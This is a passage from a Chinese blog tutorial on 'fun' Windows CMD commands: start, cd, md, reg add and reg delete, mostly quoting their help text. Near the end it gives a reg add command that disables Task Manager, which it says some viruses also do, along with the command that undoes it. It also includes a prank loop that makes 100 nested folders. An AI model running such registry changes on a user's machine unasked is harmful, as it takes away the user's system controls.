该命令处理器是使用 cmd.exe 的 /K 开关运行的。 这表示运行该命令之后，该窗口 将仍然存在。 如果它不是内部 cmd 命令或批文件，则 它就是一个程序，并将作为一个窗口化应用程序或 控制台应用程序运行。 parameters 这些是传递给 command/program 的参数。 注意: 在 64 位平台上不支持 SEPARATE 和 SHARED 选项。 通过指定 /NODE，可按照利用 NUMA 系统中的内存区域的方式 创建进程。例如，可以创建两个完全 通过共享内存互相通信的进程以共享相同的首选 NUMA 节点， 从而最大限度地减少内存延迟。只要有可能， 它们就会分配来自相同 NUMA 节点的 内存，并且会在指定节点之外的处理器上自由运行。 start /NODE 1 application1.exe start /NODE 1 application2.exe 这两个进程可被进一步限制在相同 NUMA 节点内的指定处理器 上运行。在以下示例中，application1 在 节点的两个低位处理器上运行，而 application2 在该节点的其后两个处理器上运行。该示例假定指定节点至少具有四个逻辑处理器。请注意，节点号可更改为该计算机的任何有效节点号， 而无需更改关联掩码。 start /NODE 1 /AFFINITY 0x3 application1.exe 启动 /NODE 1 /AFFINITY 0xc application2.exe 如果命令扩展被启用，通过命令行或 START 命令的外部命令 调用会如下改变: 将文件名作为命令键入，非可执行文件可以通过文件关联调用。 (例如，WORD.DOC 会调用跟 .DOC 文件扩展名关联的应用程序)。 关于如何从命令脚本内部创建这些关联，请参阅 ASSOC 和 FTYPE 命令。 执行的应用程序是 32 位 GUI 应用程序时，CMD.EXE 不等应用 程序终止就返回命令提示符。如果在命令脚本内执行，该新行为 则不会发生。 如果执行的命令行的第一个符号是不带扩展名或路径修饰符的 字符串 &quot;CMD&quot;，&quot;CMD&quot; 会被 COMSPEC 变量的数值所替换。这 防止从当前目录提取 CMD.EXE。 如果执行的命令行的第一个符号没有扩展名，CMD.EXE 会使用 PATHEXT 环境变量的数值来决定要以什么顺序寻找哪些扩展 名。PATHEXT 变量的默认值是: .COM;.EXE;.BAT;.CMD 请注意，该语法跟 PATH 变量的一样，分号隔开不同的元素。 查找可执行文件时，如果没有相配的扩展名，看一看该名称是否 与目录名相配。如果确实如此，START 会在那个路径上调用 Explorer。如果从命令行执行，则等同于对那个路径作 CD /D。 这个东西我们只介绍/min和/max。我们如何最小化打开程序？start /min cmd.exe &amp; exit运行这行命令后，当前cmd会消失，然后在任务栏中最小化弹出一个新的cmd。 当我们最大化创建一个cmd进程，命令应该这么写：start /max cmd.exe。 八、CMD下切换目录cd命令 显示当前目录名或改变当前目录。 CHDIR [/D] [drive:][path] CHDIR [..] CD [/D] [drive:][path] CD [..] .. 指定要改成父目录。 键入 CD drive: 显示指定驱动器中的当前目录。 不带参数只键入 CD，则显示当前驱动器和目录。 使用 /D 开关，除了改变驱动器的当前目录之外， 还可改变当前驱动器。 如果命令扩展被启用，CHDIR 会如下改变: 当前的目录字符串会被转换成使用磁盘名上的大小写。所以， 如果磁盘上的大小写如此，CD C:\\TEMP 会将当前目录设为 C:\\Temp。 CHDIR 命令不把空格当作分隔符，因此有可能将目录名改为一个 带有空格但不带有引号的子目录名。例如: cd \\winnt\\profiles\\username\\programs\\start menu 与下列相同: cd &quot;\\winnt\\profiles\\username\\programs\\start menu&quot; 在扩展停用的情况下，你必须键入以上命令。 我这里有个文件夹tools，如何切换？cd 相对路径或绝对路径即可。cd tools即可进入该文件夹。 九、创建文件夹的命令md emm，不要想歪了。 创建目录。 MKDIR [drive:]path MD [drive:]path 如果命令扩展被启用，MKDIR 会如下改变: 如果需要，MKDIR 会在路径中创建中级目录。例如: 假设 \\a 不 存在，那么: mkdir \\a\\b\\c\\d 与: mkdir \\a chdir \\a mkdir b chdir b mkdir c chdir c mkdir d 相同。如果扩展被停用，则需要键入 mkdir \\a\\b\\c\\d。 如何套娃？我们来套一个吧。 文件夹套娃：创建文件夹，并进入文件夹，创建文件夹，并进入文件夹……如此循环。 我们来创建深度100的套娃文件夹：for /l %i in (1,1,100) do (md 第%i层&amp;cd 第%i层) 如何进入呢？大家自行思考一下。 for /l %i in (1,1,100) do cd 第%i层 十、操作注册表reg命令 不要随便使用。只介绍这两个： reg add reg delete REG ADD KeyName [/v ValueName | /ve] [/t Type] [/s Separator] [/d Data] [/f] [/reg:32 | /reg:64] KeyName [\\\\Machine\\]FullKey Machine 远程机器名 - 忽略默认到当前机器。远程机器上 只有 HKLM 和 HKU 可用。 FullKey ROOTKEY\\SubKey ROOTKEY [ HKLM | HKCU | HKCR | HKU | HKCC ] SubKey 所选 ROOTKEY 下注册表项的完整名称。 /v 所选项之下要添加的值名称。 /ve 为注册表项添加空白值名称(默认)。 /t RegKey 数据类型 [ REG_SZ | REG_MULTI_SZ | REG_EXPAND_SZ | REG_DWORD | REG_QWORD | REG_BINARY | REG_NONE ] 如果忽略，则采用 REG_SZ。 /s 指定一个在 REG_MULTI_SZ 数据字符串中用作分隔符的字符 如果忽略，则将 &quot;\\0&quot; 用作分隔符。 /d 要分配给添加的注册表 ValueName 的数据。 /f 不用提示就强行覆盖现有注册表项。 /reg:32 指定应该使用 32 位注册表视图访问的注册表项。 /reg:64 指定应该使用 64 位注册表视图访问的注册表项。 例如: REG ADD \\\\ABC\\HKLM\\Software\\MyCo 添加远程机器 ABC 上的一个注册表项 HKLM\\Software\\MyCo REG ADD HKLM\\Software\\MyCo /v Data /t REG_BINARY /d fe340ead 添加一个值(名称: Data，类型: REG_BINARY，数据: fe340ead) REG ADD HKLM\\Software\\MyCo /v MRU /t REG_MULTI_SZ /d fax\\0mail 添加一个值(名称: MRU，类型: REG_MULTI_SZ，数据: fax\\0mail\\0\\0) REG ADD HKLM\\Software\\MyCo /v Path /t REG_EXPAND_SZ /d ^%systemroot^% 添加一个值(名称: Path，类型: REG_EXPAND_SZ，数据: %systemroot%) 注意: 在扩充字符串中使用插入符号 ( ^ ) REG DELETE KeyName [/v ValueName | /ve | /va] [/f] [/reg:32 | /reg:64] KeyName [\\\\Machine\\]FullKey 远程机器名 - 如果省略，默认情况下将使用当前机器。 远程机器上只有 HKLM 和 HKU 可用。 FullKey ROOTKEY\\SubKey ROOTKEY [ HKLM | HKCU | HKCR | HKU | HKCC ] SubKey 所选 ROOTKEY 下面的注册表项的全名。 ValueName 所选项下面的要删除的值名称。 如果省略，则删除该项下面的所有子项和值。 /ve 删除空值名称的值(默认)。 /va 删除该项下面的所有值。 /f 不用提示，强制删除。 /reg:32 指定应使用 32 位注册表视图访问 注册表项。 /reg:64 指定应使用 64 位注册表视图访问 注册表项。 示例: REG DELETE HKLM\\Software\\MyCo\\MyApp\\Timeout 删除注册表项 Timeout 及其所有子项和值 REG DELETE \\\\ZODIAC\\HKLM\\Software\\MyCo /v MTU 删除 ZODIAC 上的 MyCo 下面的注册表值 MTU 注册表不能随便修改，可能会导致系统不稳定。这里面有很多系统的设置，定期做备份，有些病毒通过修改注册表来禁用系统功能。我们来试一下用命令禁用任务管理器。 名称：DisableTaskmgr 类型：REG_DWORD 禁用： reg add &quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /v &quot;DisableTaskMgr&quot; /d 1 /t REG_DWORD /f 恢复： reg delete &quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /v &quot;DisableTaskMgr&quot; 手头没有虚拟机，就不演示了。运行后电脑的任务管理器将提示“任务管理器已被管理员禁用。” 更新： 现在有了虚拟机，我们来测试一下上面的程序： ","tags":[{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"有趣的10个CMD命令","feature":"https://daoxi365.github.io/tech-blog//post-images/you-qu-de-10-ge-cmd-ming-ling.png","link":"https://daoxi365.github.io/tech-blog/you-qu-de-10-ge-cmd-ming-ling/","stats":{"text":"26 min read","time":1534000,"words":6561,"minutes":26},"date":"2022-02-17 10:38:40","dateFormat":"2022-02-17"}]}
